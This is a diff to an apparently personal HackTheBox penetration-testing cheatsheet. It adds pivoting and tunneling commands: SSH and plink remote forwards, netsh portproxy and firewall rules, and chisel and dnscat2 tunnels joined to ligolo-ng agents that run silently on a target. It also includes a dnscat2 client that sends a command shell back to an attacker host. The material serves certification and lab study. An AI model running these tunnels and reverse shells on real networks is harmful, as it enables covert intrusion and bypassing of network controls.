@@ -64,10 +64,12 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
     - [Port Forwarding with Windows Netsh](#Port-Forwarding-with-Windows-Netsh)
     - [DNS Tunneling with Dnscat2](#DNS-Tunneling-with-Dnscat2)
-    - [SOCKS5 Tunneling with Chisel](#SOCKS5-Tunneling-with-Chisel)
+    - [HTTP Tunneling with Chisel and SOCKS5](#HTTP-Tunneling-with-Chisel-and-SOCKS5)
     - [ICMP Tunneling with SOCKS](#ICMP-Tunneling-with-SOCKS)
     - [RDP and SOCKS Tunneling with SocksOverRDP](#RDP-and-SOCKS-Tunneling-with-SocksOverRDP)
     - [Pivoting with ligolo-ng](#Pivoting-with-ligolo-ng)
+    - [Ligolo-ng + Chisel : Pivotting with HTTP Tunneling](#Ligolo-ng+++Chisel+:+Pivotting+with+HTTP+Tunneling)
+    - [Ligolo-ng + dnscat2 : Pivotting with DNS Tunneling](#Ligolo-ng+++dnscat2+:+Pivotting+with+DNS+Tunneling)
 - [Active Directory](#active-directory)
     - [Tools of the Trade](#Tools-of-the-Trade)
     - [Initial Enumeration](#initial-enumeration)
@@ -1543,7 +1545,7 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --server 192.168.220.199 --port 25 --auth LOGIN --auth-user "test@supermagicorg.com" --auth-password "test" --header "Subject: IT Configuration Required" --body @body.txt --attach @config.Library-ms --suppress-data 
 ```
 ## Pivoting, Tunneling, and Port Forwarding
-#### Local Port Forwarding with SSH 
+##### Local Port Forwarding with SSH 
 ```
 # SSH command used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.
 ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>
@@ -1564,7 +1566,7 @@ Release the terminal, do not occupy it
 -L → Local Port Forward mode
 ```
 
-#### Dynamic Local Port Forwarding with SSH and SOCKS Tunneling
+##### Dynamic Local Port Forwarding with SSH and SOCKS Tunneling
 ```
 # SSH command used to perform a dynamic port forward on port 9050 or 1080 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.
 ssh -D 9050 ubuntu@<IPaddressofTarget>
@@ -1608,10 +1610,23 @@ Release the terminal, do not occupy it
 ```
 ##### Dynamic Remote Port Forwarding with SSH and SOCKS Tunneling
 ```
-dsada
+# SSH Remote Dynamic Port Forwarding
+ssh -N -f -R 127.0.0.1:9998 sherlock-parrot@<IP-Parrot>
+or
+ssh -N -f -R 0.0.0.0:9998 sherlock-parrot@<IP-Parrot>
+or
+ssh -N -f -R 9998 sherlock-parrot@<IP-Parrot>
 
-```
+/etc/proxychains.conf  need have (socks5 	127.0.0.1 9998)
+ss -plunt | grep 9998    (in parrot)
 
+-N → Do not open a shell after connecting
+Only forward the port, do not execute commands
+
+-f → Run in the background after authentication
+Release the terminal, do not occupy it
+
+-R → Remote Port Forwarding
 
 ```
 ##### Meterpreter Tunneling and Port Forwarding
@@ -1635,6 +1650,10 @@ socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443
 ```
 # Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.
 plink -D 9050 ubuntu@<IPaddressofTarget>
+
+# Remote Port Forwarding
+cmd.exe /c echo y | C:\temp\plink.exe -ssh -l sherlock-parrot -pw <pass-kali> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.199
+ss -plunt | grep 9833    (in parrot)
 ```
 ##### SSH Pivoting with Sshuttle
 ```
@@ -1674,6 +1693,15 @@ netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42
 
 # Windows-based command used to view the configurations of a portproxy rule called v4tov4.
 netsh.exe interface portproxy show v4tov4
+
+# del setting interface
+netsh.exe interface portproxy del v4tov4 listenport=8080 listenaddress=10.129.42.198
+
+# add and del setting firewall
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.117.64 localport=2222 action=allow
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+
+
 ```
 ##### DNS Tunneling with Dnscat2
 ```
@@ -1691,8 +1719,11 @@ Import-Module .\dnscat2.ps1
 
 # PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).
 Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+
+# Run dnscat client in linux
+./dnscat --dns server=10.10.14.18,port=53 --secret=0c6cc33d5408158304ff5df2258f26a2
 ```
-##### SOCKS5 Tunneling with Chisel
+##### HTTP Tunneling with Chisel and SOCKS5
 ```
 # Clones the chisel project GitHub repository.
 git clone https://github.com/jpillora/chisel.git ; cd chisel ; go build
@@ -1701,11 +1732,14 @@ git clone https://github.com/jpillora/chisel.git ; cd chisel ; go build
 ./chisel server -v -p 1234 --socks5                     ( run on Pivot Host)
 ./chisel client -v 10.129.202.64:1234 socks             ( run on attack Host)
 /etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
+ss -plunt | grep 1080    (in parrot)
 
 # Chisel Reverse Pivot ,  Starting the Chisel Server on our Attack Host 
 sudo ./chisel server --reverse -v -p 1234 --socks5                   ( run on attack Host)
 ./chisel client -v 10.10.14.17:1234 R:socks                          ( run on Pivot Host)
 /etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
+ss -plunt | grep 1080    (in parrot)
+
 ```
 ##### ICMP Tunneling with SOCKS
 ```
@@ -1803,6 +1837,80 @@ sudo ip route add 172.16.6.0/24 dev ligolo2
 
 # Delete interface
 sudo ip link delete ligolo
+
+
+```
+##### Ligolo-ng + Chisel : Pivotting with HTTP Tunneling
+```
+# HTTP Tunneling + VPN TUN
+
+[Parrot]                                         [Target - CONFLUENCE01]
+ligolo-ng proxy (127.0.0.1:11601)                ligolo-ng agent
+       ↑                                               ↓ connect to 127.0.0.1:<local_port>
+chisel server --reverse --port 8080     <-- HTTP -->  chisel client (forward local_port -> Parrot:11601)
+
+
+# In Parrot
+./proxy -laddr 127.0.0.1:11601 -selfcert
+chisel server --port 8080 --reverse
+
+# In Target
+/tmp/chisel client <Parrot_IP>:8080 127.0.0.1:11601:127.0.0.1:11601 > /dev/null 2>&1 &
+/tmp/chisel_1.8.1_linux_amd64 client 192.168.45.199:8080 127.0.0.1:11601:127.0.0.1:11601 > /dev/null 2>&1 &
+
+/tmp/agent -connect 127.0.0.1:11601 -ignore-cert > /dev/null 2>&1 &
+
+# In Parrot
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add <internal_subnet>/24 dev ligolo
+
+# Check in Parrot
+sudo tcpdump -nvvvXi tun0 tcp port 8080
+ss -ntplu | grep -E "8080|1080|11601"
+sudo wireshark -i tun0
+
+```
+##### Ligolo-ng + dnscat2 : Pivotting with DNS Tunneling
+```
+# DNS Tunneling + VPN TUN
+
+[Parrot]                                            [Target - CONFLUENCE01]
+ligolo-ng proxy (127.0.0.1:11601)                   ligolo-ng agent
+       ↑                                                  ↓ connect to 127.0.0.1:11601
+dnscat2 server (Open port 53 UDP)  <-- DNS protocol -->  dnscat2 client (Forward port 11601 through DNS)
+
+
+# In Parrot
+./proxy -laddr 127.0.0.1:11601 -selfcert
+
+sudo dnscat2-server feline.corp
+or
+sudo ruby dnscat2.rb --dns host=<Parrot-IP>,port=53,domain=inlanefreight.local --no-cache
+
+# In Target
+./dnscat --secret=<SECRET_KEY> feline.corp
+or
+./dnscat --dns server=<Parrot-IP>,port=5335 --secret=03f42fae35752cb581d206fbafe39c29
+
+# (If target and parrot are between another machine, set ligolo to change the port)
+listener_add --addr 0.0.0.0:5335 --to 0.0.0.0:5335 --udp
+
+# In dnscat2 parrot
+dnscat2> windows
+dnscat2> window -i 1 # Select the correct command session for the target
+# Syntax: listen [Potassium_Receiving_IP]:[Potassium_Receiving_Port] [Internal_Destination_IP]:[Destination_Port]
+command (target) 1> listen 127.0.0.1:11601 127.0.0.1:11601
+
+# In Target
+/tmp/agent -connect 127.0.0.1:11601 -ignore-cert > /dev/null 2>&1 &
+
+# Check in Parrot
+ss -ntplu | grep -E "11601|53"
+sudo tcpdump -i tun0 -nX udp port 53
+sudo tcpdump -i tun0 -nvvvX
+sudo wireshark -i tun0
+
 ```
 ## Active Directory
 
